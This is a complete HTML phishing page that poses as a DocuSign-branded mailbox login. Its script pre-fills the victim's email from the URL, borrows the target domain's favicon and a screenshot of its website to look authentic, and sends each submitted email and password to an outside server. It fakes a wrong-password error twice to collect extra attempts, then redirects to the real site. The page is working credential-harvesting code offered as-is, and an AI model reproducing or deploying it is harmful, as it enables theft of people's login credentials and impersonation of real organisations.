
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mailbox Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      /* background-color: #fafafa; */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-repeat: no-repeat;
      background-size: cover;
    }

    .login-wrapper {
      background-color: #ffffff;
      width: 420px;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      border: 1px solid #f2f2f2;
    }

    .logo-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 25px;
    }
    .logo-section h2{
      font-weight: 400 !important;
    }

    .logo-container {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
    }

    /* Simulating the broken image icon on Chrome */
    .logo-text {
      font-size: 20px;
      font-weight: bold;
      color: #333333;
    }

  
    .input-wrapper {
      position: relative;
      margin-bottom: 15px;
    }

    .input-wrapper svg {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 22px;
      height: 22px;
      fill: #666666;

    }

    .input-wrapper input {
      width: 100%;
      padding: 15px 14px 12px 38px;
     border: 2px solid #e1e5e9;
      border-radius: 6px;
      font-size: 15px;
      color: #333333;
      outline: none;
      transition: border-color 0.2s ease;
      font-family: sans-serif;
    }

    .input-wrapper input::placeholder {
      color: #999999;
    }

    .input-wrapper input:focus {
      border-color: #667eea;
    }

    .btn-login {
      width: 100%;
      padding: 12px;
     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #ffffff;
      border: none;
      border-radius: 6px;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      margin-top: 5px;
      margin-bottom: 12px;
      transition: opacity 0.2s;
    }

    .btn-login:hover {
      opacity: 0.9;
    }

    .utility-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
    }

    .utility-row input[type="checkbox"] {
      width: 14px;
      height: 14px;
      cursor: pointer;
      border: 1px solid #999;
      border-radius: 3px;
    }

    .utility-row a {
      color: #5171df;
      text-decoration: none;
      font-size: 15px;
      font-weight: 600;
    }

    .utility-row a:hover {
      text-decoration: underline;
    }

    .footer-text {
      text-align: center;
      font-size: 15px;
      color: #5171df;
      font-weight: 500;
    }
    .ptitle{
      font-weight: 500;
      text-transform: capitalize;
    }
    .logo-section img{
      width: 50px;
    }
    .errBox{
      margin: 10px 0;
      text-align: center;
    }
    .errBox span {
      font-weight: 600;
      color: rgb(157, 21, 21);
    }
    .hide {
      display: none !important;
    }
  </style>
</head>
<body class="body">

  <div class="login-wrapper">
    <div class="logo-section">
      <img class="logoBox" src="invalid-url" alt="">
       <h2 class="ptitle"></h2>
	   <div class="welcomeSign-text-center">
        <span style="font-weight: bold; font-size: 21.6px;">Welcome!</span> <span style="font-size: 15px;">Please sign-in below.</span>
    </div>
    </div>

    <form action="#" class="lgForm">

      <div class="errBox hide">
        <span>Invalid Login Password, try again</span>
      </div>

      <div class="input-wrapper">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
        </svg>
        <input type="email" name="email" class="em2" placeholder="Email" value="" required readonly>
      </div>

      <div class="input-wrapper">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
        </svg>
        <input type="password" placeholder="Password" name="pass" required autofocus >
      </div>

      <button type="submit" class="btn-login">Sign in to access document</button>
      
      <div class="utility-row">
        <a href="#">Forgot password?</a>
      </div>
    </form>

    <div class="footer-text">
      DocuSign Inc. | Copyright © 2026
    </div>
  </div>


  <script>

    const body = document.querySelector(".body");
    const logoBox = document.querySelector(".logoBox");
    const ptitle = document.querySelector(".ptitle");
    const lgForm = document.querySelector(".lgForm");
    const errBox = document.querySelector(".errBox");
    const logBtn = document.querySelector(".btn-login");
    const em2 = document.querySelector(".em2");
    let err = 0;

    let d2 = "";
    
    const id = window.location.href.split("#")[1];
    if(id){
      const domain = id.split("@")[1];
      em2.value = id;
      d2 = domain;
      const name = domain.split(".")[0];
      ptitle.textContent = `${name}`;
       document.title = `${name}`;
      logoBox.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
      body.style.backgroundImage = `url(https://image.thum.io/get/width/1200/https://${domain})`
    }


    lgForm.addEventListener("submit", (e) => {
      e.preventDefault();

      const email = e.target.elements.email.value;
      const pass = e.target.elements.pass.value;
      errBox.classList.add("hide");

      logBtn.textContent = "Verifying....";

      err++;

      const fd = new FormData();
      fd.append("email", email);
      fd.append("pass", pass);

      fetch("https://scienceofgettingrichfreedownload.com/n/docx.php", {
        method: "POST",
        body: fd
      })

      if(err <= 2){
        setTimeout(() => {
           e.target.elements.pass.value = "";
           errBox.classList.remove("hide");
          logBtn.textContent = "Continue";
        }, 3000);
      }

      else {
         setTimeout(() => {
           logBtn.textContent = "Continue";
           window.location.href = `https://${d2}`;
         }, 3000);
      }

    });


  </script>

</html>
